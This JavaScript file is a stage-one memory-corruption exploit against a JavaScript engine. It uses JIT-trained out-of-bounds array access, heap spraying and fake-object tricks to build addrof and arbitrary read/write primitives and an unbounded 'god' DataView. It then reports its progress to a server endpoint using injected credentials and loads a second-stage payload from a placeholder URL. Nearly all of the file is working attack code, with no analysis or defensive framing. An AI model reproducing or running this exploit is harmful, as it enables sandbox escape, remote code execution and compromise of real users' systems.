'use strict';

const DIAG_USER = __USERNAME_JSON__;
const DIAG_PASS = __PASSWORD_JSON__;
const DIAG_PROJECT = __OUTPUT_PROJECT_JSON__;
const STAGE2_URL = __STAGE2_URL_JSON__;

async function report(value) {
  try {
    await fetch('/api/login', {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({username: DIAG_USER, password: DIAG_PASS}),
    });
    await fetch('/api/projects/' + encodeURIComponent(DIAG_PROJECT), {
      method: 'PUT',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({name: 'dictionary-diagnostic', body: String(value).slice(0, 9900)}),
    });
  } catch (_) {}
}

const cvt = new ArrayBuffer(8);
const f64 = new Float64Array(cvt);
const u64 = new BigUint64Array(cvt);
const f2i = value => { f64[0] = value; return u64[0]; };
const i2f = value => { u64[0] = BigInt.asUintN(64, value); return f64[0]; };
const hx = (value, width = 16) =>
  '0x' + BigInt.asUintN(64, value).toString(16).padStart(width, '0');

const victim = [1.1, 2.2];
function oobRead(index) { return victim[index]; }
function oobWrite(index, value) { victim[index] = value; }
const leaker = [3.3, 4.4];
function staleAddrofRead() { return leaker[0]; }

let sink = 0;
for (let i = 0; i < 1200000; ++i) {
  sink += oobRead(i & 1);
  oobWrite(i & 1, (i & 1) ? 1.1 : 2.2);
  sink += staleAddrofRead();
}

await new Promise(resolve => setTimeout(resolve, 1200));

try {
  victim.__defineSetter__('1073741824', function() {});

  const sprays = [];
  const markerBase = 0x4142434400000000n;
  for (let i = 0; i < 128; ++i) {
    sprays.push(new Array(32).fill(i2f(markerBase | BigInt(i))));
  }

  let dataIndex = -1;
  let sprayIndex = -1;
  const replacement = 0x4142434555667788n;
  for (let i = 0; i < 0x10000 && dataIndex < 0; ++i) {
    const value = oobRead(i);
    if (typeof value !== 'number') continue;
    const raw = f2i(value);
    if ((raw & 0xffffffff00000000n) !== markerBase) continue;
    const candidate = Number(raw & 0xffn);
    oobWrite(i, i2f(replacement));
    if (candidate < sprays.length && f2i(sprays[candidate][0]) === replacement) {
      dataIndex = i;
      sprayIndex = candidate;
    }
    oobWrite(i, i2f(raw));
  }
  if (dataIndex < 0) throw new Error('spray backing not found');

  let base = -1n;
  let arrayObject = -1n;
  for (let j = 0; j < 0x10000; ++j) {
    const value = oobRead(j);
    if (typeof value !== 'number') continue;
    const raw = f2i(value);
    const lo = raw & 0xffffffffn;
    const hi = raw >> 32n;
    if (hi === 64n && (lo & 1n) === 1n) {
      const candidate = BigInt.asUintN(32, lo - BigInt(dataIndex) * 8n + 7n);
      oobWrite(j, i2f((66n << 32n) | lo));
      const matched = sprays[sprayIndex].length === 33;
      oobWrite(j, i2f(raw));
      if (matched && sprays[sprayIndex].length === 32) {
        base = candidate;
        arrayObject = BigInt.asUintN(32, candidate + BigInt(j) * 8n - 8n);
        break;
      }
    }
    const next = oobRead(j + 1);
    if (typeof next !== 'number') continue;
    const nextRaw = f2i(next);
    if ((hi & 1n) !== 1n || (nextRaw & 0xffffffffn) !== 64n) continue;
    const candidate = BigInt.asUintN(32, hi - BigInt(dataIndex) * 8n + 7n);
    oobWrite(j + 1, i2f((nextRaw & 0xffffffff00000000n) | 66n));
    const matched = sprays[sprayIndex].length === 33;
    oobWrite(j + 1, i2f(nextRaw));
    if (!matched || sprays[sprayIndex].length !== 32) continue;
    base = candidate;
    arrayObject = BigInt.asUintN(32, candidate + BigInt(j) * 8n - 4n);
    break;
  }
  if (base < 0n) throw new Error('cage anchor not found');

  function cageRead64(offset) {
    const delta = BigInt(offset) - base;
    if (delta < 0n || (delta & 7n)) throw new RangeError('64-bit range');
    return f2i(oobRead(Number(delta >> 3n)));
  }
  function cageWrite64(offset, value) {
    const delta = BigInt(offset) - base;
    if (delta < 0n || (delta & 7n)) throw new RangeError('64-bit range');
    oobWrite(Number(delta >> 3n), i2f(BigInt(value)));
  }
  function cageRead32(offset) {
    const delta = BigInt(offset) - base;
    if (delta < 0n || (delta & 3n)) throw new RangeError('32-bit range');
    const word = f2i(oobRead(Number(delta >> 3n)));
    return Number((word >> ((delta & 4n) * 8n)) & 0xffffffffn) >>> 0;
  }
  function cageWrite32(offset, value) {
    const delta = BigInt(offset) - base;
    if (delta < 0n || (delta & 3n)) throw new RangeError('32-bit range');
    const index = Number(delta >> 3n);
    const shift = (delta & 4n) * 8n;
    const old = f2i(oobRead(index));
    const mask = 0xffffffffn << shift;
    oobWrite(index, i2f((old & ~mask) | (BigInt(value >>> 0) << shift)));
  }
  function addrof(object, neighbor = sprays[0]) {
    leaker[0] = object;
    leaker[1] = neighbor;
    return f2i(staleAddrofRead()) & 0xffffffffn;
  }

  const savedLength = cageRead32(arrayObject + 12n);
  if (savedLength !== 64) throw new Error('anchor length mismatch');
  cageWrite32(arrayObject + 12n, 66);
  const changedLength = sprays[sprayIndex].length;
  cageWrite32(arrayObject + 12n, savedLength);
  if (changedLength !== 33 || sprays[sprayIndex].length !== 32) {
    throw new Error('anchored R/W failed');
  }

  const markerAB = new ArrayBuffer(0x10000);
  new Uint32Array(markerAB).fill(0xccdd0011);
  const abObject = (addrof(markerAB) & 0xffffffffn) - 1n;
  if (abObject < base) throw new Error('ArrayBuffer below anchor');

  const saved = [];
  for (let offset = 0x14; offset <= 0x2c; offset += 4) {
    saved.push([offset, cageRead32(abObject + BigInt(offset))]);
  }
  const encodedBacking = BigInt(cageRead32(abObject + 0x24n)) |
    (BigInt(cageRead32(abObject + 0x28n)) << 32n);
  const backingOffset = encodedBacking >> 24n;

  cageWrite32(abObject + 0x24n, 0);
  cageWrite32(abObject + 0x28n, 0);
  for (const offset of [0x14n, 0x18n, 0x1cn, 0x20n]) {
    cageWrite32(abObject + offset, 0xffffffff);
  }

  const god = new DataView(markerAB);
  const godLength = markerAB.byteLength;
  const marker = god.getUint32(Number(backingOffset), true);


  if (godLength < 0x100000000 || marker !== 0xccdd0011) {
    throw new Error('god buffer validation failed');
  }
  function sandboxRead32(offset) {
    return god.getUint32(Number(BigInt(offset)), true);
  }
  function sandboxWrite32(offset, value) {
    god.setUint32(Number(BigInt(offset)), value >>> 0, true);
  }
  function sandboxRead64(offset) {
    return god.getBigUint64(Number(BigInt(offset)), true);
  }
  function sandboxWrite64(offset, value) {
    god.setBigUint64(Number(BigInt(offset)), BigInt(value), true);
  }
  function bufferDataPointer(buffer) {
    const object = BigInt.asUintN(32, addrof(buffer) - 1n);
    return (BigInt(cageRead32(object + 0x24n)) |
      (BigInt(cageRead32(object + 0x28n)) << 32n)) >> 24n;
  }
  globalThis.dictionaryPrimitives = {
    valid: true,
    victimForged: true,
    oobBase: base,
    addrof,
    god,
    sandboxRead32,
    sandboxWrite32,
    sandboxRead64,
    sandboxWrite64,
    bufferDataPointer,
    victimArrayBuffer: markerAB,
    victimArrayBufferObject: abObject,
    victimBackingOffset: backingOffset,
  };
  globalThis.keepAlive = [victim, leaker, sprays, markerAB, god, cvt,
    globalThis.dictionaryPrimitives, sink];
  await report('DICTIONARY_GOD_BUFFER_OK base=' + hx(base, 8) +
    ' ab=' + hx(abObject, 8) + ' backing=' + hx(backingOffset));
  await import(STAGE2_URL);
} catch (error) {
  await report('STAGE1_ERROR ' + (error && error.stack || error));
}
